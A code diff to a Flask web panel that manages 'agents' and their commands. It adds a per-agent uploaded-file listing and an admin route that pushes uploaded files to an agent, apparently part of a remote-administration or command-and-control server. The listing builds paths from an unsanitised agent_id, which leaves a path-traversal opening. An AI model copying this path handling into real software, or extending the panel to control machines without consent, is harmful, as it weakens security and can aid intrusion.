@@ -20,6 +20,10 @@ from models import Agent
 from models import Command
 from models import User
 
+from werkzeug import secure_filename
+
+import os
+
 
 def hash_and_salt(password):
     password_hash = hashlib.sha256()
@@ -119,7 +123,28 @@ def agent_detail(agent_id):
     agent = Agent.query.get(agent_id)
     if not agent:
         abort(404)
-    return render_template('agent_detail.html', agent=agent)
+
+    # FileList
+    path = os.path.dirname(os.path.dirname(__file__))
+    myfiles = os.path.join(path, 'uploads/' + agent_id + '/')
+
+    # If it's a new Agent, have to create folder first
+    if not os.path.exists(myfiles):
+        os.makedirs(myfiles)
+
+    os.chdir(myfiles)
+    x = 0
+    d = {}
+    files = sorted(os.listdir(os.getcwd()), key=os.path.getmtime) # Ordered by time creation
+
+    for file in reversed(files):
+        if not os.path.isdir(file): # Not folders
+            d[x] = (myfiles + file)
+            x = x + 1
+
+    os.chdir(path)
+
+    return render_template('agent_detail.html', agent=agent, filelist=d)
 
 
 @webui.route('/agents/rename', methods=['POST'])
@@ -137,3 +162,23 @@ def rename_agent():
 @webui.route('/uploads/<path:path>')
 def uploads(path):
     return send_from_directory(current_app.config['UPLOAD_FOLDER'], path)
+
+# This uploads the file that you want to send to the Agent.
+# For sending the file we have to locate it in a URL for downloading then
+# So now, we can Drag & Drop files to the File Input and send directly
+@webui.route('/sendfile/<agent_id>', methods=['GET', 'POST'])
+@require_admin
+def upload_file(agent_id):
+    UPLOAD_DIRECTORY = 'uploads/'
+    if request.method == 'POST':
+        file = request.files['file']
+        if file:
+            agent_dir = os.path.join(UPLOAD_DIRECTORY, agent_id)
+            updir = os.path.join(agent_dir, 'sentfiles')
+            if not os.path.exists(updir):
+                os.makedirs(updir)
+            filename = secure_filename(file.filename)
+            full_path = os.path.join(updir, filename)
+            file.save(full_path)
+            return full_path
+    return "Error uploading file"
